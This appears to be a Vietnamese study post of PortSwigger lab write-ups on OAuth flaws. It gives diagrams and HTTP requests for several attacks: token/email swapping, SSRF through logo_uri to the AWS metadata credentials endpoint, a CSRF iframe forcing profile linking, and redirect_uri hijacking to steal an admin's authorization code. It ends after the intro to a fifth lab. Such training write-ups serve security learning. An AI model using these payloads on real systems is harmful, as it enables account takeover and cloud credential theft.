---
layout: post
title: "OAuth authentication"
render_with_liquid: false
categories:
  - Web Security
  - PortSwigger
tags:
  - portswigger
  - oauth-authentication
source_collection: notion_portswigger
---
Topics: Advanced

# **Lab 01: Authentication bypass via OAuth implicit flow**

Server **tin tưởng dữ liệu từ client** trong OAuth implicit flow. Client nhận `email` và `access_token` từ OAuth provider, nhưng server **KHÔNG verify** email có khớp với token không. Attacker có thể **thay đổi email** trong request mà vẫn giữ nguyên token → Login as bất kỳ ai.

**OAuth Implicit Flow bình thường**

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         OAUTH IMPLICIT FLOW                                  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   ┌────────┐              ┌──────────┐              ┌─────────────────┐     ║
║   │ User   │              │  Client  │              │ OAuth Provider  │     ║
║   │ (Browser)             │  (Blog)  │              │ (Social Media)  │     ║
║   └───┬────┘              └────┬─────┘              └────────┬────────┘     ║
║       │                        │                             │              ║
║       │  1. Click "Login"      │                             │              ║
║       │───────────────────────>│                             │              ║
║       │                        │                             │              ║
║       │  2. Redirect to OAuth  │                             │              ║
║       │  /auth?client_id=xxx&redirect_uri=...                │              ║
║       │<───────────────────────│                             │              ║
║       │                                                      │              ║
║       │  3. GET /auth                                        │              ║
║       │─────────────────────────────────────────────────────>│              ║
║       │                                                      │              ║
║       │  4. Login form (wiener:peter)                        │              ║
║       │<─────────────────────────────────────────────────────│              ║
║       │                                                      │              ║
║       │  5. POST /login                                      │              ║
║       │─────────────────────────────────────────────────────>│              ║
║       │                                                      │              ║
║       │                              ┌───────────────────────┴───────┐      ║
║       │                              │ Verify credentials            │      ║
║       │                              │ Generate access_token         │      ║
║       │                              │ token linked to wiener        │      ║
║       │                              └───────────────────────┬───────┘      ║
║       │                                                      │              ║
║       │  6. Redirect with token in URL fragment             │              ║
║       │  /callback#access_token=ABC123&email=wiener@web.net │              ║
║       │<─────────────────────────────────────────────────────│              ║
║       │                                                                     ║
║       │  7. JavaScript extracts data from URL fragment       │              ║
║       │  {                                                   │              ║
║       │    access_token: "ABC123",                           │              ║
║       │    email: "wiener@web.net"                           │              ║
║       │  }                                                   │              ║
║       │                                                                     ║
║       │  8. POST /authenticate                               │              ║
║       │  {                                                   │              ║
║       │    email: "wiener@web.net",                          │              ║
║       │    access_token: "ABC123"                            │              ║
║       │  }                                                   │              ║
║       │───────────────────────────>│                                        ║
║       │                            │                                        ║
║       │                ┌───────────┴──────────┐                             ║
║       │                │ ❌ LỖI:              │                             ║
║       │                │ Trust email from     │                             ║
║       │                │ client               │                             ║
║       │                │                      │                             ║
║       │                │ Create session for   │                             ║
║       │                │ wiener               │                             ║
║       │                └───────────┬──────────┘                             ║
║       │                            │                                        ║
║       │  9. Session cookie         │                                        ║
║       │<───────────────────────────│                                        ║
║       │                                                                     ║
║       │  ✓ Logged in as wiener                                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Flow tấn công**

```jsx
┌─────────────────────────────────────────────────────────────────────────────┐
│                              ATTACK FLOW                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  STEP 1: Login bình thường để hiểu flow                                      │
│  ═══════════════════════════════════════════                                │
│                                                                             │
│     Attacker                          OAuth                   Client       │
│         │                                │                       │          │
│         │  Login with wiener:peter       │                       │          │
│         │───────────────────────────────>│                       │          │
│         │                                │                       │          │
│         │  Redirect with token           │                       │          │
│         │  #access_token=ABC123          │                       │          │
│         │  &email=wiener@web.net         │                       │          │
│         │<───────────────────────────────│                       │          │
│         │                                │                       │          │
│         │  POST /authenticate            │                       │          │
│         │  email=wiener@web.net          │                       │          │
│         │  access_token=ABC123           │                       │          │
│         │───────────────────────────────────────────────────────>│          │
│         │                                │                       │          │
│         │  ✓ Session created for wiener  │                       │          │
│         │<───────────────────────────────────────────────────────│          │
│         │                                │                       │          │
│         │  📌 Observe trong Burp Proxy   │                       │          │
│                                                                             │
│  STEP 2: Intercept và modify POST /authenticate                             │
│  ═══════════════════════════════════════════════                            │
│                                                                             │
│     Attacker                          OAuth                   Client       │
│         │                                │                       │          │
│         │  Send to Repeater              │                       │          │
│         │  POST /authenticate            │                       │          │
│         │  email=wiener@web.net          │                       │          │
│         │  access_token=ABC123           │                       │          │
│         │                                │                       │          │
│         │  ┌──────────────────────────┐  │                       │          │
│         │  │ MODIFY REQUEST:          │  │                       │          │
│         │  │                          │  │                       │          │
│         │  │ Change email to:         │  │                       │          │
│         │  │ carlos@carlos-montoya.net│  │                       │          │
│         │  │                          │  │                       │          │
│         │  │ Keep same token!         │  │                       │          │
│         │  └──────────────────────────┘  │                       │          │
│         │                                │                       │          │
│         │  POST /authenticate            │                       │          │
│         │  email=carlos@carlos-montoya.net ← CHANGED             │          │
│         │  access_token=ABC123         ← SAME TOKEN              │          │
│         │───────────────────────────────────────────────────────>│          │
│         │                                │                       │          │
│         │                                │       ┌───────────────┴────────┐ │
│         │                                │       │ ❌ KHÔNG verify:        │ │
│         │                                │       │ • Token belongs to who? │ │
│         │                                │       │ • Email matches token?  │ │
│         │                                │       │                         │ │
│         │                                │       │ Chỉ check:              │ │
│         │                                │       │ • Token valid? ✓        │ │
│         │                                │       │                         │ │
│         │                                │       │ Create session for:     │ │
│         │                                │       │ carlos! ✓               │ │
│         │                                │       └───────────────┬────────┘ │
│         │                                │                       │          │
│         │  200 OK                        │                       │          │
│         │  Session for carlos            │                       │          │
│         │<───────────────────────────────────────────────────────│          │
│         │                                │                       │          │
│         │  ✓ Logged in as carlos!        │                       │          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

# **Lab 02: SSRF via OpenID dynamic client registration**

OAuth server cho phép **dynamic client registration** mà **không cần authentication**. Khi đăng ký client, attacker có thể chỉ định `logo_uri`. Server sẽ **fetch logo từ URL này** khi render authorization page, dẫn đến **SSRF** - cho phép attacker đọc AWS metadata endpoint và lấy credentials.

**OpenID Dynamic Client Registration**

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                  OPENID DYNAMIC CLIENT REGISTRATION                          ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   OpenID Connect specification cho phép client applications tự động đăng ký  ║
║   với OAuth provider thông qua registration endpoint                         ║
║                                                                              ║
║   Discovery endpoint:                                                        ║
║   /.well-known/openid-configuration                                          ║
║   → Chứa thông tin về OAuth server, bao gồm registration_endpoint            ║
║                                                                              ║
║   Registration endpoint:                                                     ║
║   POST /reg                                                                  ║
║   {                                                                          ║
║     "redirect_uris": ["https://client.com/callback"],                        ║
║     "client_name": "My App",                                                 ║
║     "logo_uri": "https://client.com/logo.png",  ← QUAN TRỌNG!               ║
║     "grant_types": ["authorization_code"]                                    ║
║   }                                                                          ║
║                                                                              ║
║   Response:                                                                  ║
║   {                                                                          ║
║     "client_id": "abc123xyz",                                                ║
║     "client_secret": "secret456",                                            ║
║     "redirect_uris": [...],                                                  ║
║     "logo_uri": "https://client.com/logo.png"                                ║
║   }                                                                          ║
║                                                                              ║
║   📌 Logo được dùng để hiển thị trên authorization page                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Flow tấn công**

```jsx
┌─────────────────────────────────────────────────────────────────────────────┐
│                              ATTACK FLOW                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  STEP 1: Discovery                                                           │
│  ═══════════════════                                                         │
│                                                                             │
│     Attacker                          OAuth Server                          │
│         │                                  │                                │
│         │  GET /.well-known/openid-configuration                            │
│         │─────────────────────────────────>│                                │
│         │                                  │                                │
│         │  {                               │                                │
│         │    "issuer": "https://oauth...", │                                │
│         │    "authorization_endpoint": ...,│                                │
│         │    "token_endpoint": ...,        │                                │
│         │    "registration_endpoint": "/reg" ← PHÁT HIỆN!                   │
│         │  }                               │                                │
│         │<─────────────────────────────────│                                │
│         │                                  │                                │
│         │  📌 Server có dynamic registration!                               │
│                                                                             │
│  STEP 2: Register client (test Collaborator)                                │
│  ═══════════════════════════════════════════                                │
│                                                                             │
│     Attacker                          OAuth Server          Collaborator    │
│         │                                  │                     │          │
│         │  POST /reg                       │                     │          │
│         │  {                               │                     │          │
│         │    "redirect_uris": ["https://example.com"],           │          │
│         │    "logo_uri": "https://burp-collab.net/test"          │          │
│         │  }                               │                     │          │
│         │─────────────────────────────────>│                     │          │
│         │                                  │                     │          │
│         │  {                               │                     │          │
│         │    "client_id": "abc123"         │                     │          │
│         │  }                               │                     │          │
│         │<─────────────────────────────────│                     │          │
│         │                                  │                     │          │
│         │  GET /client/abc123/logo         │                     │          │
│         │─────────────────────────────────>│                     │          │
│         │                                  │                     │          │
│         │                      ┌───────────┴──────────┐          │          │
│         │                      │ Fetch logo từ:       │          │          │
│         │                      │ logo_uri             │          │          │
│         │                      └───────────┬──────────┘          │          │
│         │                                  │                     │          │
│         │                                  │  GET /test          │          │
│         │                                  │────────────────────>│          │
│         │                                  │                     │          │
│         │                                  │  200 OK             │          │
│         │                                  │<────────────────────│          │
│         │                                  │                     │          │
│         │  [Logo image or error]           │                     │          │
│         │<─────────────────────────────────│                     │          │
│         │                                  │                     │          │
│         │  Check Collaborator              │                     │          │
│         │  ✓ HTTP request received!        │                     │          │
│         │                                  │                     │          │
│         │  📌 SSRF confirmed!              │                     │          │
│                                                                             │
│  STEP 3: Exploit SSRF to access AWS metadata                                │
│  ═══════════════════════════════════════════════                            │
│                                                                             │
│     Attacker                          OAuth Server          AWS Metadata    │
│         │                                  │                     │          │
│         │  POST /reg                       │                     │          │
│         │  {                               │                     │          │
│         │    "redirect_uris": ["https://example.com"],           │          │
│         │    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/..."  │
│         │  }                               │                     │          │
│         │─────────────────────────────────>│                     │          │
│         │                                  │                     │          │
│         │  {                               │                     │          │
│         │    "client_id": "xyz789"         │                     │          │
│         │  }                               │                     │          │
│         │<─────────────────────────────────│                     │          │
│         │                                  │                     │          │
│         │  GET /client/xyz789/logo         │                     │          │
│         │─────────────────────────────────>│                     │          │
│         │                                  │                     │          │
│         │                      ┌───────────┴──────────┐          │          │
│         │                      │ Fetch logo:         │          │          │
│         │                      │ http://169.254...   │          │          │
│         │                      └───────────┬──────────┘          │          │
│         │                                  │                     │          │
│         │                                  │  GET /latest/meta-data/iam/... │
│         │                                  │────────────────────>│          │
│         │                                  │                     │          │
│         │                                  │  {                  │          │
│         │                                  │    "AccessKeyId": "ASIA...",   │
│         │                                  │    "SecretAccessKey": "...",   │
│         │                                  │    "Token": "..."   │          │
│         │                                  │  }                  │          │
│         │                                  │<────────────────────│          │
│         │                                  │                     │          │
│         │  Response body:                  │                     │          │
│         │  {                               │                     │          │
│         │    "AccessKeyId": "ASIA...",     │                     │          │
│         │    "SecretAccessKey": "xyz123abc..."  ← LEAKED!        │          │
│         │  }                               │                     │          │
│         │<─────────────────────────────────│                     │          │
│         │                                  │                     │          │
│         │  Submit SecretAccessKey          │                     │          │
│         │  ✓ Lab solved!                   │                     │          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         REQUEST 1: REGISTER CLIENT                           ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  POST /reg HTTP/1.1                                                          ║
║  Host: oauth-0abc123.oauth-server.net                                        ║
║  Content-Type: application/json                                              ║
║                                                                              ║
║  {                                                                           ║
║    "redirect_uris": [                                                        ║
║      "https://example.com"                                                   ║
║    ]                                                                         ║
║  }                                                                           ║
║                                                                              ║
║  ───────────────────────────────────────────────────────────────             ║
║  Response:                                                                   ║
║  ───────────────────────────────────────────────────────────────             ║
║                                                                              ║
║  HTTP/1.1 201 Created                                                        ║
║  Content-Type: application/json                                              ║
║                                                                              ║
║  {                                                                           ║
║    "client_id": "abc123xyz",                                                 ║
║    "client_secret": "secret456",                                             ║
║    "redirect_uris": ["https://example.com"],                                 ║
║    "client_id_issued_at": 1234567890,                                        ║
║    "client_secret_expires_at": 0                                             ║
║  }                                                                           ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════════════════════════╗
║                    REQUEST 2: REGISTER WITH LOGO_URI (TEST)                  ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  POST /reg HTTP/1.1                                                          ║
║  Host: oauth-0abc123.oauth-server.net                                        ║
║  Content-Type: application/json                                              ║
║                                                                              ║
║  {                                                                           ║
║    "redirect_uris": [                                                        ║
║      "https://example.com"                                                   ║
║    ],                                                                        ║
║    "logo_uri": "https://burp-collaborator-subdomain.com"                     ║
║  }                                                                           ║
║                                                                              ║
║  Response: client_id = "def456"                                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════════════════════════╗
║                    REQUEST 3: TRIGGER SSRF (GET LOGO)                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  GET /client/def456/logo HTTP/1.1                                            ║
║  Host: oauth-0abc123.oauth-server.net                                        ║
║                                                                              ║
║  → Server fetches: https://burp-collaborator-subdomain.com                   ║
║  → Collaborator receives HTTP request ✓                                      ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════════════════════════╗
║                    REQUEST 4: REGISTER WITH AWS METADATA                     ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  POST /reg HTTP/1.1                                                          ║
║  Host: oauth-0abc123.oauth-server.net                                        ║
║  Content-Type: application/json                                              ║
║                                                                              ║
║  {                                                                           ║
║    "redirect_uris": [                                                        ║
║      "https://example.com"                                                   ║
║    ],                                                                        ║
║    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
║  }                                                                           ║
║                                                                              ║
║  Response: client_id = "ghi789"                                              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════════════════════════╗
║                    REQUEST 5: RETRIEVE AWS CREDENTIALS                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  GET /client/ghi789/logo HTTP/1.1                                            ║
║  Host: oauth-0abc123.oauth-server.net                                        ║
║                                                                              ║
║  ───────────────────────────────────────────────────────────────             ║
║  Response:                                                                   ║
║  ───────────────────────────────────────────────────────────────             ║
║                                                                              ║
║  HTTP/1.1 200 OK                                                             ║
║  Content-Type: application/json                                              ║
║                                                                              ║
║  {                                                                           ║
║    "Code": "Success",                                                        ║
║    "LastUpdated": "2024-11-25T10:00:00Z",                                    ║
║    "Type": "AWS-HMAC",                                                       ║
║    "AccessKeyId": "ASIAXYZ123ABC456",                                        ║
║    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",           ║
║    "Token": "very-long-token-string...",                                     ║
║    "Expiration": "2024-11-25T16:00:00Z"                                      ║
║  }                                                                           ║
║                                                                              ║
║  📌 Copy SecretAccessKey → Submit solution!                                  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**AWS Metadata Endpoint**

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         AWS METADATA ENDPOINT                                ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   Link-local address: 169.254.169.254                                        ║
║   Chỉ accessible từ TRONG EC2 instance                                       ║
║                                                                              ║
║   Endpoint structure:                                                        ║
║   ────────────────────                                                       ║
║                                                                              ║
║   http://169.254.169.254/latest/meta-data/                                   ║
║   ├── instance-id                                                            ║
║   ├── hostname                                                               ║
║   ├── public-ipv4                                                            ║
║   ├── iam/                                                                   ║
║   │   └── security-credentials/                                              ║
║   │       └── [role-name]/          ← TARGET                                 ║
║   │           ├── AccessKeyId                                                ║
║   │           ├── SecretAccessKey    ← SENSITIVE!                            ║
║   │           ├── Token                                                      ║
║   │           └── Expiration                                                 ║
║   └── ...                                                                    ║
║                                                                              ║
║   Target URL trong lab:                                                      ║
║   http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/    ║
║                                                                              ║
║   Response example:                                                          ║
║   {                                                                          ║
║     "Code": "Success",                                                       ║
║     "LastUpdated": "2024-01-01T12:00:00Z",                                   ║
║     "Type": "AWS-HMAC",                                                      ║
║     "AccessKeyId": "ASIAXYZ123ABC",                                          ║
║     "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",          ║
║     "Token": "...",                                                          ║
║     "Expiration": "2024-01-01T18:00:00Z"                                     ║
║   }                                                                          ║
║                                                                              ║
║   📌 SecretAccessKey có thể dùng để access AWS services!                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

# **Lab 03: Forced OAuth profile linking**

Chức năng **link OAuth profile** không có **CSRF protection** (thiếu `state` parameter). Attacker có thể tạo CSRF attack để **link social profile của mình vào account của victim**. Sau đó attacker login bằng social profile của mình → truy cập account của victim.

**OAuth Profile Linking bình thường**

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         OAUTH PROFILE LINKING                                ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   Mục đích: Cho phép user login bằng social media thay vì password          ║
║                                                                              ║
║   Flow:                                                                      ║
║   1. User đã có account trên blog (wiener:peter)                             ║
║   2. User muốn link social profile để login nhanh hơn                        ║
║   3. Click "Attach social profile"                                           ║
║   4. OAuth flow: Login vào social media                                      ║
║   5. Social media trả về authorization code                                  ║
║   6. Blog site dùng code để link profile vào account hiện tại                ║
║   7. Lần sau user có thể "Login with social media"                           ║
║                                                                              ║
║   ┌────────────────────────────────────────────────────────────────────┐     ║
║   │                                                                    │     ║
║   │   Blog Account: wiener                                             │     ║
║   │   ├─ Username: wiener                                              │     ║
║   │   ├─ Password: peter                                               │     ║
║   │   └─ Linked Social Profile: peter.wiener ← LINK                    │     ║
║   │                                                                    │     ║
║   └────────────────────────────────────────────────────────────────────┘     ║
║                                                                              ║
║   Sau khi link, có 2 cách login:                                             ║
║   • Classic: wiener:peter                                                    ║
║   • OAuth: Login với peter.wiener → Auto login as wiener                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Flow bình thường**

```jsx
┌─────────┐                ┌──────────┐              ┌─────────────────┐
│ Wiener  │                │  Blog    │              │ Social Media    │
└────┬────┘                └────┬─────┘              └────────┬────────┘
     │                          │                             │
     │  1. Click "Attach social profile"                      │
     │─────────────────────────>│                             │
     │                          │                             │
     │  2. Redirect to OAuth    │                             │
     │  /auth?client_id=...&redirect_uri=/oauth-linking       │
     │<─────────────────────────│                             │
     │                                                         │
     │  3. GET /auth            │                              │
     │────────────────────────────────────────────────────────>│
     │                                                         │
     │  4. Login peter.wiener:hotdog                           │
     │────────────────────────────────────────────────────────>│
     │                                                         │
     │                              ┌──────────────────────────┴────┐
     │                              │ Generate authorization code   │
     │                              │ code=ABC123                   │
     │                              └──────────────────────────┬────┘
     │                                                         │
     │  5. Redirect with code       │                          │
     │  /oauth-linking?code=ABC123  │                          │
     │<────────────────────────────────────────────────────────│
     │                              │                         │
     │  6. GET /oauth-linking?code=ABC123                     │
     │─────────────────────────────>│                         │
     │                              │                         │
     │                  ┌───────────┴──────────┐              │
     │                  │ Exchange code→token  │              │
     │                  │ Get social profile   │              │
     │                  │ Link to wiener       │              │
     │                  └───────────┬──────────┘              │
     │                              │                         │
     │  ✓ Profile linked!           │                         │
     │<─────────────────────────────│                         │
     ▼                              ▼                         ▼
```

**Flow tấn công (CSRF):**

```jsx
┌─────────────────────────────────────────────────────────────────────────────┐
│                              ATTACK FLOW                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  STEP 1: Attacker tạo malicious link                                        │
│  ═══════════════════════════════════════                                    │
│                                                                             │
│     Attacker                          Social Media                          │
│         │                                  │                                │
│         │  1. Bắt đầu OAuth flow           │                                │
│         │  Click "Attach social profile"   │                                │
│         │─────────────────────────────────>│                                │
│         │                                  │                                │
│         │  2. Login với attacker's account │                                │
│         │  peter.wiener:hotdog             │                                │
│         │─────────────────────────────────>│                                │
│         │                                  │                                │
│         │  3. Redirect với code            │                                │
│         │  /oauth-linking?code=XYZ789      │                                │
│         │<─────────────────────────────────│                                │
│         │                                  │                                │
│         │  ┌────────────────────────────┐  │                                │
│         │  │ INTERCEPT trong Burp:      │  │                                │
│         │  │ GET /oauth-linking?code=XYZ789                                 │
│         │  │                            │  │                                │
│         │  │ Copy URL                   │  │                                │
│         │  │ DROP request (giữ code)    │  │                                │
│         │  └────────────────────────────┘  │                                │
│         │                                  │                                │
│         │  📌 Code: XYZ789 (chưa dùng, còn hợp lệ)                          │
│                                                                             │
│  STEP 2: Attacker gửi CSRF payload cho admin                                │
│  ═══════════════════════════════════════════                                │
│                                                                             │
│     Attacker                          Admin               Blog              │
│         │                                │                  │               │
│         │  Craft exploit:                │                  │               │
│         │  <iframe src="/oauth-linking?code=XYZ789">        │               │
│         │                                │                  │               │
│         │  Send email/message            │                  │               │
│         │───────────────────────────────>│                  │               │
│         │                                │                  │               │
│         │                    ┌───────────┴──────────┐       │               │
│         │                    │ Admin opens exploit  │       │               │
│         │                    │ Browser auto-loads   │       │               │
│         │                    │ iframe               │       │               │
│         │                    └───────────┬──────────┘       │               │
│         │                                │                  │               │
│         │                                │  GET /oauth-linking?code=XYZ789  │
│         │                                │  Cookie: session=ADMIN_SESSION   │
│         │                                │─────────────────>│               │
│         │                                │                  │               │
│         │                                │      ┌───────────┴──────────┐    │
│         │                                │      │ ❌ KHÔNG check:      │    │
│         │                                │      │ • state parameter    │    │
│         │                                │      │ • CSRF token         │    │
│         │                                │      │                      │    │
│         │                                │      │ Exchange code→token  │    │
│         │                                │      │ Social profile:      │    │
│         │                                │      │ peter.wiener         │    │
│         │                                │      │                      │    │
│         │                                │      │ LINK to admin! ✓     │    │
│         │                                │      └───────────┬──────────┘    │
│         │                                │                  │               │
│         │                                │  Profile linked! │               │
│         │                                │<─────────────────│               │
│         │                                │                  │               │
│         │  📌 Admin's account giờ link với attacker's social profile!       │
│                                                                             │
│  STEP 3: Attacker login vào admin account                                   │
│  ═══════════════════════════════════════════                                │
│                                                                             │
│     Attacker                          Blog                                  │
│         │                                │                                  │
│         │  Click "Login with social media"                                  │
│         │  Login: peter.wiener:hotdog    │                                  │
│         │───────────────────────────────>│                                  │
│         │                                │                                  │
│         │                    ┌───────────┴──────────┐                       │
│         │                    │ Social profile:      │                       │
│         │                    │ peter.wiener         │                       │
│         │                    │                      │                       │
│         │                    │ Linked to: admin ✓   │                       │
│         │                    │                      │                       │
│         │                    │ Login as admin!      │                       │
│         │                    └───────────┬──────────┘                       │
│         │                                │                                  │
│         │  ✓ Logged in as admin!         │                                  │
│         │  → Delete carlos               │                                  │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

# **Lab 04: OAuth account hijacking via redirect_uri**

OAuth provider **không validate redirect_uri** đúng cách. Attacker có thể **thay đổi redirect_uri** thành domain của mình. Khi victim có **active session** với OAuth provider, authorization code sẽ được gửi đến domain của attacker → Attacker dùng code để **hijack victim's account**.

**OAuth Authorization Code Flow**

```jsx
╔══════════════════════════════════════════════════════════════════════════════╗
║                         OAUTH AUTHORIZATION CODE FLOW                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║   Step 1: User click "Login with OAuth"                                      ║
║   ────────────────────────────────────────                                   ║
║   Blog redirect đến OAuth provider:                                          ║
║   GET /auth?client_id=xxx&redirect_uri=https://blog.com/callback&...         ║
║                                                                              ║
║   Step 2: User authenticate với OAuth provider                               ║
║   ───────────────────────────────────────────────                            ║
║   (Nếu chưa login, hiển thị login form)                                      ║
║   (Nếu đã login → skip step này)                                             ║
║                                                                              ║
║   Step 3: OAuth provider redirect với authorization code                     ║
║   ─────────────────────────────────────────────────────────────              ║
║   302 Redirect:                                                              ║
║   Location: https://blog.com/callback?code=ABC123XYZ                         ║
║                                    ▲▲▲▲▲▲▲▲▲▲▲▲                              ║
║                                    Authorization code                        ║
║                                                                              ║
║   Step 4: Blog server exchange code for access token                         ║
║   ────────────────────────────────────────────────────                       ║
║   POST /token                                                                ║
║   code=ABC123XYZ&client_id=xxx&client_secret=secret                          ║
║                                                                              ║
║   Step 5: Get user info và login                                             ║
║   ────────────────────────────────────                                       ║
║   GET /userinfo với access_token                                             ║
║   → Create session for user                                                  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

**Flow bình thường:**

```jsx
┌─────────┐              ┌──────────┐              ┌─────────────────┐
│  User   │              │  Blog    │              │ OAuth Provider  │
└────┬────┘              └────┬─────┘              └────────┬────────┘
     │                        │                             │
     │  1. Click "Login"      │                             │
     │───────────────────────>│                             │
     │                        │                             │
     │  2. Redirect to OAuth  │                             │
     │  /auth?redirect_uri=https://blog.com/callback        │
     │<───────────────────────│                             │
     │                                                      │
     │  3. GET /auth          │                             │
     │─────────────────────────────────────────────────────>│
     │                                                      │
     │  4. Login (if needed)  │                             │
     │─────────────────────────────────────────────────────>│
     │                                                      │
     │  5. Redirect với code  │                             │
     │  https://blog.com/callback?code=ABC123               │
     │<─────────────────────────────────────────────────────│
     │                        │                             │
     │  6. GET /callback?code=ABC123                        │
     │───────────────────────>│                             │
     │                        │                             │
     │                        │  7. Exchange code→token     │
     │                        │────────────────────────────>│
     │                        │                             │
     │                        │  8. Token + user info       │
     │                        │<────────────────────────────│
     │                        │                             │
     │  9. Logged in!         │                             │
     │<───────────────────────│                             │
     ▼                        ▼                             ▼
```

**Flow tấn công (redirect_uri manipulation):**

```jsx
┌─────────────────────────────────────────────────────────────────────────────┐
│                              ATTACK FLOW                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  STEP 1: Attacker test redirect_uri validation                              │
│  ═══════════════════════════════════════════════                            │
│                                                                             │
│     Attacker                          OAuth Provider                        │
│         │                                  │                                │
│         │  GET /auth?                      │                                │
│         │  client_id=xxx&                  │                                │
│         │  redirect_uri=https://blog.com/callback                           │
│         │─────────────────────────────────>│                                │
│         │                                  │                                │
│         │  302 https://blog.com/callback?code=...                           │
│         │<─────────────────────────────────│                                │
│         │                                  │                                │
│         │  Test với arbitrary redirect_uri:                                 │
│         │  GET /auth?                      │                                │
│         │  redirect_uri=https://evil.com   │                                │
│         │─────────────────────────────────>│                                │
│         │                                  │                                │
│         │                      ┌───────────┴──────────┐                     │
│         │                      │ ❌ KHÔNG validate!   │                     │
│         │                      │ Accept arbitrary URI │                     │
│         │                      └───────────┬──────────┘                     │
│         │                                  │                                │
│         │  302 https://evil.com?code=...   │                                │
│         │<─────────────────────────────────│                                │
│         │                                  │                                │
│         │  📌 redirect_uri KHÔNG được validate!                             │
│                                                                             │
│  STEP 2: Craft exploit để steal admin's code                                │
│  ═══════════════════════════════════════════                                │
│                                                                             │
│     Attacker                          Admin              OAuth              │
│         │                                │                  │               │
│         │  Exploit server - iframe:      │                  │               │
│         │  <iframe src="/auth?           │                  │               │
│         │    client_id=xxx&              │                  │               │
│         │    redirect_uri=https://exploit-server.net&       │               │
│         │    ...">                       │                  │               │
│         │                                │                  │               │
│         │  Deliver to victim             │                  │               │
│         │───────────────────────────────>│                  │               │
│         │                                │                  │               │
│         │                    ┌───────────┴──────────┐       │               │
│         │                    │ Admin opens page     │       │               │
│         │                    │ Browser loads iframe │       │               │
│         │                    └───────────┬──────────┘       │               │
│         │                                │                  │               │
│         │                                │  GET /auth?      │               │
│         │                                │  redirect_uri=exploit-server.net │
│         │                                │  Cookie: oauth_session=admin     │
│         │                                │─────────────────>│               │
│         │                                │                  │               │
│         │                                │      ┌───────────┴──────────┐    │
│         │                                │      │ Admin có active      │    │
│         │                                │      │ session → AUTO       │    │
│         │                                │      │ APPROVE!             │    │
│         │                                │      │                      │    │
│         │                                │      │ Generate code        │    │
│         │                                │      └───────────┬──────────┘    │
│         │                                │                  │               │
│         │                                │  302 Redirect:   │               │
│         │                                │  https://exploit-server.net?code=XYZ789
│         │                                │<─────────────────│               │
│         │                                │                  │               │
│         │  GET /?code=XYZ789             │                  │               │
│         │  (Admin's browser)             │                  │               │
│         │<───────────────────────────────│                  │               │
│         │                                │                  │               │
│         │  📌 Access log: code=XYZ789    │                  │               │
│         │     (Admin's authorization code!)                 │               │
│                                                                             │
│  STEP 3: Use stolen code để login                                           │
│  ═══════════════════════════════════════                                    │
│                                                                             │
│     Attacker                          Blog                 OAuth            │
│         │                                │                   │              │
│         │  Navigate to:                  │                   │              │
│         │  /oauth-callback?code=XYZ789   │                   │              │
│         │───────────────────────────────>│                   │              │
│         │                                │                   │              │
│         │                    ┌───────────┴──────────┐        │              │
│         │                    │ Exchange code→token  │        │              │
│         │                    │ Code: XYZ789         │        │              │
│         │                    │ (Admin's code!)      │        │              │
│         │                    └───────────┬──────────┘        │              │
│         │                                │                   │              │
│         │                                │  POST /token      │              │
│         │                                │  code=XYZ789      │              │
│         │                                │──────────────────>│              │
│         │                                │                   │              │
│         │                                │  access_token     │              │
│         │                                │  (admin's!)       │              │
│         │                                │<──────────────────│              │
│         │                                │                   │              │
│         │                                │  GET /userinfo    │              │
│         │                                │──────────────────>│              │
│         │                                │                   │              │
│         │                                │  admin profile    │              │
│         │                                │<──────────────────│              │
│         │                                │                   │              │
│         │  ✓ Logged in as admin!         │                   │              │
│         │  → Delete carlos               │                   │              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

# **Lab 05: Stealing OAuth access tokens via an open redirect**

Lab này kết hợp **3 lỗ hổng** để steal OAuth access token:

1. **Weak redirect_uri validation**: Cho phép path traversal
2. **Open redirect**: Endpoint `/post/next?path=` redirect đến arbitrary URL
3. **OAuth Implicit Flow**: Access token trong URL fragment

